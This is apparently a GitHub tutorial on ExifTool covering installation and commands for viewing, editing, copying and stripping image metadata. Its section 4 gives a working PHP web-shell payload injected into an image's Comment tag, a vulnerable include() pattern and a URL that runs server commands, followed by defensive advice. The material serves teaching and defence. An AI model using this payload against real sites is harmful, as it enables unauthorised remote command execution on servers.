
![image](https://github.com/user-attachments/assets/3796b8d2-2b25-43ad-9537-5029b1f2a7c0)


## 1. What is ExifTool?

**ExifTool** is a free command-line application used to **read**, **modify**, and **delete** metadata stored inside digital media files such as images, videos, and audio files.
Metadata is hidden information inside these files describing properties like:

* Camera details (model, manufacturer)
* Date and time when the image or video was created
* Camera settings like ISO, shutter speed, focus
* GPS coordinates showing where the photo was taken
* Other info such as the author’s name or software used for editing

---

## 2. Installing ExifTool

* **On Windows:**
  Download ExifTool from the official website [**https://exiftool.org**](https://exiftool.org/)
  Rename the downloaded file from `exiftool(-k).exe` to `exiftool.exe` and place it in a convenient folder so you can run it from the command prompt.

* **On Linux (Debian/Ubuntu):**
  Open terminal and run:

  ```bash
  sudo apt install libimage-exiftool-perl
  ```

* **On macOS:**
  If you have Homebrew installed, run:

  ```bash
  brew install exiftool
  ```

---

## 3. Basic ExifTool Commands

### 3.1 View all metadata in an image file

```bash
exiftool image.jpg
```

This command reads and displays all metadata stored inside the file `image.jpg`.
The output can be very long, so you may want to scroll or search within it.

---

### 3.2 List all available metadata tags in detail

```bash
exiftool -a -s -G1 image.jpg
```

* `-a`: Show duplicate tags
* `-s`: Show tag names only (short format)
* `-G1`: Show tag groups (e.g., EXIF, IPTC, XMP)

This command helps you identify exact tag names to edit or remove.

---

### 3.3 Modify a specific metadata tag

For example, changing the Artist or Author tag:

```bash
exiftool -Artist="John Doe" image.jpg
```

This sets the `Artist` tag in `image.jpg` to "John Doe".

---

### 3.4 Remove specific metadata tags

For example, remove GPS location data:

```bash
exiftool -GPSLongitude= -GPSLatitude= image.jpg
```

This deletes the GPS longitude and latitude metadata tags from the image.

---

### 3.5 Remove all metadata from an image

```bash
exiftool -all= image.jpg
```

This command removes all metadata but keeps the image file intact.

---

### 3.6 Remove all metadata without keeping a backup

By default, ExifTool keeps a backup copy of the original file. To overwrite without backup:

```bash
exiftool -all= -overwrite_original image.jpg
```

---

### 3.7 Copy metadata from one image to another

```bash
exiftool -TagsFromFile source.jpg target.jpg
```

Copies all metadata tags from `source.jpg` to `target.jpg`.

---

### 3.8 Batch edit metadata for multiple files

Change a tag for all images inside a directory and its subdirectories:

```bash
exiftool -r -Artist="John Doe" directory/
```

`-r` means recursive into subdirectories, and `directory/` is the folder name.

---

### 3.9 Export metadata to CSV file

Export specific metadata fields to a CSV for analysis:

```bash
exiftool -csv -r -f -FileName -DateTimeOriginal directory/ > metadata.csv
```

---


<p align="center">
  <img src="https://github.com/user-attachments/assets/7786216b-1599-4744-ae91-962e94ecab64" alt="image" />
</p>


## 4. Using ExifTool in File Upload Vulnerabilities

### 4.1 Background on File Upload Vulnerabilities

Websites often restrict file uploads to safe file types (like images) to prevent malicious files (e.g., PHP scripts) from being uploaded and executed.

Attackers can sometimes **hide malicious code inside image metadata** and upload images to bypass restrictions.

---

### 4.2 How to inject malicious code using ExifTool

You can embed PHP code inside metadata tags like `Comment`.

Example to inject a PHP web shell inside an image:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' innocent.jpg
```

This command inserts PHP code into the `Comment` tag of `innocent.jpg`.

---

### 4.3 Exploiting the injected image

If the target website includes or executes the uploaded image file (e.g., via PHP `include()`):

```php
include("uploads/" . $_GET['img']);
```

Then visiting:

```
http://target.com/uploads/innocent.jpg?cmd=ls
```

will execute the `ls` command on the server, giving you a web shell.

---

### 4.4 Common metadata tags used for code injection

| Tag Name         | Notes                                            |
| ---------------- | ------------------------------------------------ |
| Comment          | Most commonly used tag for injection             |
| UserComment      | Supports Unicode, harder to filter               |
| ImageDescription | Used by some image viewers or tools              |
| Title            | Sometimes displayed or indexed by search engines |

---

### 4.5 How to defend against this attack

* Never use `include()` or `eval()` on uploaded files directly.
* Strip metadata from uploaded images immediately after upload:

  ```bash
  exiftool -all= -overwrite_original uploaded.jpg
  ```
* Validate file types by checking the actual file content (magic bytes), not just the file extension.
* Apply strict file upload restrictions and filtering.

---

## 5. Summary of Important ExifTool Commands

| Purpose                                | Command                                                                     |
| -------------------------------------- | --------------------------------------------------------------------------- |
| View all metadata                      | `exiftool file.jpg`                                                         |
| List all metadata tags                 | `exiftool -a -s -G1 file.jpg`                                               |
| Modify a tag                           | `exiftool -tag=value file.jpg`                                              |
| Remove a specific tag                  | `exiftool -Tag= file.jpg`                                                   |
| Remove all metadata                    | `exiftool -all= file.jpg`                                                   |
| Remove all metadata without backup     | `exiftool -all= -overwrite_original file.jpg`                               |
| Copy metadata from one file to another | `exiftool -TagsFromFile source.jpg target.jpg`                              |
| Batch edit metadata                    | `exiftool -r -tag=value directory/`                                         |
| Export metadata to CSV                 | `exiftool -csv -r -f -FileName -DateTimeOriginal directory/ > metadata.csv` |

---

